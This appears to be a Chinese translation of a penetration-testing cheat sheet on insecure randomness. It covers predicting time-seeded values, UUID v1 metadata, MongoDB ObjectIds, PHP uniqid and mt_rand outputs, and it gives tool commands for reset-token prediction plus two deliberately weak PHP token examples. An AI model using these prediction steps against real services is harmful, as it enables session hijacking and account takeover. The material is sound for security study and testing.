# Insecure Randomness - 不安全随机数

[SEARCH_KEYWORDS]
漏洞类型: Insecure Randomness 不安全随机数 弱随机数 Predictable Random
攻击类型: Session Hijacking Token Prediction IDOR Bypass Authentication Bypass
关键词: random seed predict GUID UUID MongoDB ObjectId uniqid mt_rand
技术: Time-Based Seed Prediction GUID Version Attack ObjectId Prediction
工具: guidtool mongo-objectid-predict reset-tolkien mt_rand-reverse

[CONTENT]

## 不安全随机数概述

不安全随机数指的是计算中随机数生成的弱点，特别是当这种随机性用于安全关键目的时。随机数生成器(RNG)的漏洞可能导致可预测的输出，可能被攻击者利用。

## 基于时间的种子

许多RNG使用当前系统时间作为种子：

```py
import random
import time

seed = int(time.time())
random.seed(seed)
print(random.randint(1, 100))
```

攻击者如果知道或估计种子值，可以重新生成正确的随机值。

## GUID/UUID

GUID版本识别：`xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx`

| 版本 | 说明 |
|------|------|
| 0 | 仅`00000000-0000-0000-0000-000000000000` |
| 1 | 基于时间或时钟序列 |
| 2 | RFC 4122保留 |
| 3 | 基于MD5哈希 |
| 4 | 随机生成 |
| 5 | 基于SHA1哈希 |

### 工具

```ps1
$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
UUID version: 1
UUID time: 2022-04-13 08:06:13.202186
UUID MAC address: 00:15:5d:01:ef:00
```

## MongoDB ObjectId

12字节ObjectId结构：
- **时间戳** (4字节)：创建时间
- **机器标识符** (3字节)：主机名或IP
- **进程ID** (2字节)：进程ID
- **计数器** (3字节)：递增计数器

示例：`5ae9b90a2c144b9def01ec37`

### 预测工具

```ps1
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
5ae9bac82c144b9def01ec39
5ae9bacf2c144b9def01ec3a
```

## uniqid

基于时间戳，可逆：

```py
import math
import datetime

def reverse_uniqid(value: str) -> float:
    sec = int(value[:8], 16)
    usec = int(value[8:], 16)
    return float(f"{sec}.{usec}")
```

示例：`6659cea087cd6`

## mt_rand

使用两个输出值无需暴力破解：

```ps1
./display_mt_rand.php 12345678 123
712530069 674417379

./reverse_mt_rand.py 712530069 674417379 123 1
```

## 自定义算法

不安全示例：
- `$token = md5($emailId).rand(10,9999);`
- `$token = md5(time()+123456789 % rand(4000, 55000000));`

### 工具

reset-tolkien - 时间基础密钥利用：

```ps1
reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT"
reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Randomness/README.md